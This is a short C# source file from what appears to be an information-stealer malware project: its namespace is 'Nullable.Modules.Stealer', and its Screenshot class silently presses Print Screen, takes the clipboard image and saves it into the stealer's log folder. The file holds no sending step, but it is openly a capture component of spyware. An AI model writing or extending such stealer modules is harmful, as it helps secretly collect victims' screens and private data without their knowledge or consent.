using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Nullable.Modules.Stealer
{
    internal sealed class Screenshot
    {
        public static void Grab()
        {
            SendKeys.Send("{PRTSC}");
            Image SS = Clipboard.GetImage();
            SS.Save(Config.LogPath + "\\Screenshot.jpg");
        }
    }
}
